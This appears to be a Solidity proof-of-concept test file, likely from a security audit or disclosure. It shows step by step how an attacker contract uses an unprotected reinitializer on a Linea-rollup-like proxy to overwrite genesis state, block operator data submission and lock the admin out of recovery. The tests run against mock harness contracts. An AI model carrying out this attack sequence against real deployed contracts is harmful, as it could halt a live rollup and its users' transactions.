// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    LineaF1SimpleProxy,
    LineaRollupLike,
    LineaReinitDosAttacker,
    ILineaRollupLike
} from "../src/LineaF1ReinitializerDosHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for the unprotected reinitializer DoS.
contract LineaF1ReinitializerDosTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_brick_genesis_submission_via_reinitializer5() public {
        address admin = address(0xA11CE);
        address operator = address(0xA0A0);
        address attackerEOA = address(0xBEEF);

        LineaRollupLike implementation = new LineaRollupLike();
        LineaF1SimpleProxy proxy = new LineaF1SimpleProxy(admin);
        ILineaRollupLike rollup = ILineaRollupLike(address(proxy));
        LineaReinitDosAttacker attacker = new LineaReinitDosAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        vm.prank(admin);
        rollup.initialize(0, operator);

        require(rollup.canSubmitData(rollup.GENESIS_SHNARF(), 1, 1), "baseline submission path should be valid");

        vm.prank(attackerEOA);
        attacker.poisonGenesis(address(proxy));

        require(
            rollup.shnarfFinalBlockNumbers(rollup.GENESIS_SHNARF()) == type(uint256).max,
            "attacker should overwrite genesis final block"
        );
        require(!rollup.canSubmitData(rollup.GENESIS_SHNARF(), 1, 1), "attacker should invalidate next submission");

        vm.prank(operator);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(ILineaRollupLike.submitData.selector, rollup.GENESIS_SHNARF(), 1, 1)
        );
        require(!ok, "operator submission should revert after attack");
    }

    function test_admin_cannot_recover_once_attacker_consumes_reinitializer_version() public {
        address admin = address(0xA11CE);
        address operator = address(0xA0A0);
        address attackerEOA = address(0xBEEF);

        LineaRollupLike implementation = new LineaRollupLike();
        LineaF1SimpleProxy proxy = new LineaF1SimpleProxy(admin);
        ILineaRollupLike rollup = ILineaRollupLike(address(proxy));
        LineaReinitDosAttacker attacker = new LineaReinitDosAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        vm.prank(admin);
        rollup.initialize(0, operator);

        vm.prank(attackerEOA);
        attacker.poisonGenesis(address(proxy));

        bytes32[] memory shnarfs = new bytes32[](1);
        uint256[] memory blocks = new uint256[](1);
        shnarfs[0] = rollup.GENESIS_SHNARF();
        blocks[0] = 0;

        vm.prank(admin);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(ILineaRollupLike.initializeParentShnarfsAndFinalizedState.selector, shnarfs, blocks)
        );
        require(!ok, "admin should be locked out once attacker consumes reinitializer(5)");
    }
}
